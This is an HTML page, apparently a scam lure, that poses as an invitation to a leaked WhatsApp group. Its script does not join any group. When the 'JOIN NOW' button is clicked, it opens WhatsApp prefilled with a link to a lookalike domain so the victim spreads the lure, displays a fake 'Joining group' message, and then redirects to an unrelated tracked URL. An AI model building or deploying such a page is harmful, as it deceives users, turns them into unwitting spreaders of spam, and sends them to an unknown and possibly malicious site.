<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>WhatsApp Group Leak</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      text-align: center;
      background-color: #f2f2f2;
    }
    .container {
      padding: 20px;
    }
    .main-img {
      width: 100%;
      max-width: 400px;
      border-radius: 10px;
    }
    .join-button {
      display: inline-block;
      margin-top: 20px;
      padding: 15px 30px;
      background-color: #25D366;
      color: white;
      font-size: 20px;
      border: none;
      border-radius: 8px;
      text-decoration: none;
    }
    .join-button:hover {
      background-color: #128C7E;
    }
    #loading {
      display: none;
      margin-top: 20px;
      font-size: 18px;
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="https://drive.google.com/uc?id=1Lch4TCz68wv6hJnM4nIyuNNPhGLOrnt9" class="main-img" alt="WhatsApp Group Image">
    <h1>New Group Leak</h1>

    <a href="#" id="joinBtn" class="join-button">JOIN NOW</a>

    <div id="loading">Joining group... Please wait</div>
  </div>

  <script>
    document.getElementById('joinBtn').addEventListener('click', function(e) {
      e.preventDefault();

      // WhatsApp Open
      window.open('https://wa.me/?text=https://whatstapp-leek.vercel.app/', '_blank');

      // Loading Text Show
      document.getElementById('loading').style.display = 'block';

      // After 4 seconds Redirect
      setTimeout(function() {
        window.location.href = "https://marathonseaside.com/u99e6tce?key=2f56fb3f45647eec5d32f53a22cea248";
      }, 4000);
    });
  </script>

</body>
</html>
